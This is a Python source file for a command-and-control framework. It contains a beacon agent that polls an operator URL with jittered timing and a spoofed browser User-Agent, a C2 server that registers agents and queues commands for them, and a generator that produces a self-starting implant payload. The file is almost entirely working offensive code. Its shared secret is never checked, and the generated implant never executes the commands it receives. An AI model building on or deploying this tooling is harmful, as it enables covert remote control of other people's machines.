import json
import queue
import random
import threading
import time
import uuid
from typing import Callable, Dict, List, Optional

from tools.log_utils import get_logger

logger = get_logger("c2_beacon")

TASK_STATUS_PENDING = "pending"
TASK_STATUS_SENT = "sent"
TASK_STATUS_DONE = "done"
TASK_STATUS_FAILED = "failed"


class BeaconTask:
    def __init__(self, cmd: str, task_id: Optional[str] = None):
        self.task_id = task_id or uuid.uuid4().hex[:12]
        self.cmd = cmd
        self.status = TASK_STATUS_PENDING
        self.result = None
        self.created_at = time.time()
        self.completed_at = None

    def to_dict(self) -> dict:
        return {
            "task_id": self.task_id,
            "cmd": self.cmd,
            "status": self.status,
            "result": self.result,
            "created_at": self.created_at,
            "completed_at": self.completed_at,
        }


class BeaconAgent:
    def __init__(self, agent_id: str, callback_url: str, interval: float = 5.0,
                 jitter: float = 0.3, user_agent: str = "Mozilla/5.0"):
        self.agent_id = agent_id
        self.callback_url = callback_url.rstrip("/")
        self.interval = interval
        self.jitter = jitter
        self.user_agent = user_agent
        self.task_queue: queue.Queue = queue.Queue()
        self.results: Dict[str, Dict] = {}
        self._running = False
        self._thread = None
        self._session_id = uuid.uuid4().hex[:8]

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._thread.start()
        logger.info("Beacon %s started, callback: %s", self.agent_id, self.callback_url)
        return self

    def stop(self):
        self._running = False
        logger.info("Beacon %s stopped", self.agent_id)

    def add_task(self, cmd: str) -> str:
        task = BeaconTask(cmd)
        self.task_queue.put(task)
        return task.task_id

    def get_result(self, task_id: str, block: bool = False, timeout: float = 30) -> Optional[dict]:
        task = self.results.get(task_id)
        if task or not block:
            return task
        deadline = time.time() + timeout
        while time.time() < deadline:
            task = self.results.get(task_id)
            if task:
                return task
            time.sleep(0.5)
        return None

    def _beacon_loop(self):
        import requests as req
        sess = req.Session()
        sess.headers.update({"User-Agent": self.user_agent})

        while self._running:
            try:
                wait = self.interval + random.uniform(-self.jitter, self.jitter) * self.interval
                time.sleep(max(0.5, wait))

                payload = {"id": self.agent_id, "session": self._session_id}
                ready_tasks = []
                while not self.task_queue.empty():
                    try:
                        t = self.task_queue.get_nowait()
                        ready_tasks.append(t.to_dict())
                    except queue.Empty:
                        break
                if ready_tasks:
                    payload["tasks"] = ready_tasks
                    for t in ready_tasks:
                        t["status"] = TASK_STATUS_SENT

                resp = sess.post(self.callback_url + "/beacon", json=payload, timeout=15)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        for task_data in data.get("new_tasks", []):
                            task = BeaconTask(task_data.get("cmd", ""), task_data.get("task_id"))
                            self.task_queue.put(task)
                            logger.debug("Beacon got new task: %s", task.task_id)
                    except Exception:
                        pass
            except Exception as e:
                logger.debug("Beacon callback error: %s", e)
                time.sleep(self.interval * 2)

        sess.close()

    def poll_tasks(self, exec_fn: Callable[[str], str]) -> List[dict]:
        completed = []
        while not self.task_queue.empty():
            try:
                task = self.task_queue.get_nowait()
                try:
                    task.result = exec_fn(task.cmd)
                    task.status = TASK_STATUS_DONE
                except Exception as e:
                    task.result = str(e)
                    task.status = TASK_STATUS_FAILED
                task.completed_at = time.time()
                self.results[task.task_id] = task.to_dict()
                completed.append(task.to_dict())
            except queue.Empty:
                break
        return completed


class C2Server:
    def __init__(self, bind_host: str = "0.0.0.0", bind_port: int = 8888,
                 secret: str = "changeme"):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.secret = secret
        self.agents: Dict[str, Dict] = {}
        self.pending_tasks: Dict[str, List[dict]] = {}
        self._http_server = None
        self._running = False

    def start(self):
        from http.server import BaseHTTPRequestHandler, HTTPServer

        class C2Handler(BaseHTTPRequestHandler):
            server_ctx = self

            def log_message(self, fmt, *args):
                pass

            def do_POST(self):
                length = int(self.headers.get("content-length", 0))
                body = self.rfile.read(length)
                try:
                    data = json.loads(body)
                except Exception:
                    self.send_error(400)
                    return
                if self.path == "/beacon":
                    self._handle_beacon(data)
                elif self.path == "/submit":
                    self._handle_submit(data)
                else:
                    self.send_error(404)

            def _handle_beacon(self, data):
                agent_id = data.get("id", "unknown")
                if agent_id not in self.server_ctx.agents:
                    self.server_ctx.agents[agent_id] = {
                        "first_seen": time.time(),
                        "last_seen": time.time(),
                        "session": data.get("session", ""),
                        "ip": self.client_address[0],
                    }
                    logger.info("New beacon agent: %s from %s", agent_id, self.client_address[0])
                self.server_ctx.agents[agent_id]["last_seen"] = time.time()

                tasks_data = data.get("tasks", [])
                for td in tasks_data:
                    tid = td.get("task_id")
                    if tid:
                        self.server_ctx.agents[agent_id].setdefault("results", {})[tid] = td

                response = {"new_tasks": self.server_ctx.pending_tasks.pop(agent_id, [])}
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("X-C2-Server", "opencode-beacon/1.0")
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())

            def _handle_submit(self, data):
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')

        self._http_server = HTTPServer((self.bind_host, self.bind_port), C2Handler)
        self._running = True
        t = threading.Thread(target=self._http_server.serve_forever, daemon=True)
        t.start()
        logger.info("C2 server listening on %s:%d", self.bind_host, self.bind_port)
        return self

    def stop(self):
        self._running = False
        if self._http_server:
            self._http_server.shutdown()

    def deploy_task(self, agent_id: str, cmd: str) -> str:
        task_id = uuid.uuid4().hex[:12]
        if agent_id not in self.pending_tasks:
            self.pending_tasks[agent_id] = []
        self.pending_tasks[agent_id].append({"task_id": task_id, "cmd": cmd})
        return task_id

    def list_agents(self) -> List[dict]:
        return [{"id": aid, **info} for aid, info in self.agents.items()]

    def get_results(self, agent_id: str) -> Dict:
        agent = self.agents.get(agent_id, {})
        return agent.get("results", {})


def generate_agent_payload(server_url: str, agent_id: Optional[str] = None,
                            interval: float = 5.0) -> str:
    aid = agent_id or uuid.uuid4().hex[:8]
    code = '''import json,threading,queue,time,random,uuid,requests as req
class BeaconTask:
    def __init__(self,cmd,task_id=None):
        self.task_id=task_id or uuid.uuid4().hex[:12]
        self.cmd=cmd;self.status='pending';self.result=None;self.created_at=time.time()
        self.completed_at=None
    def to_dict(self):
        return {'task_id':self.task_id,'cmd':self.cmd,'status':self.status,'result':self.result,'created_at':self.created_at,'completed_at':self.completed_at}
class BeaconAgent:
    def __init__(self,agent_id,callback_url,interval=5.0,jitter=0.3,ua='Mozilla/5.0'):
        self.agent_id=agent_id;self.callback_url=callback_url.rstrip('/')
        self.interval=interval;self.jitter=jitter;self.user_agent=ua
        self.task_queue=queue.Queue();self.results={};self._running=True
        self._session_id=uuid.uuid4().hex[:8]
    def start(self):
        import requests as r; s=r.Session(); s.headers.update({'User-Agent':self.user_agent})
        while self._running:
            try:
                time.sleep(max(0.5,self.interval+random.uniform(-self.jitter,self.jitter)*self.interval))
                p={'id':self.agent_id,'session':self._session_id}
                rt=[]
                while not self.task_queue.empty():
                    try:
                        t=self.task_queue.get_nowait();rt.append(t.to_dict());t.status='sent'
                    except queue.Empty:break
                if rt:p['tasks']=rt
                try:
                    resp=s.post(self.callback_url+'/beacon',json=p,timeout=15)
                    if resp.status_code==200:
                        for td in resp.json().get('new_tasks',[]):
                            self.task_queue.put(BeaconTask(td.get('cmd',''),td.get('task_id')))
                except Exception:time.sleep(self.interval*2)
            except Exception:break
        s.close()
    def stop(self):self._running=False
id="%s"; cb="%s"; i=%s
a=BeaconAgent(id,cb,interval=i)
t=threading.Thread(target=a.start,daemon=True);t.start()
import atexit;atexit.register(a.stop)
''' % (aid, server_url, interval)
    return code
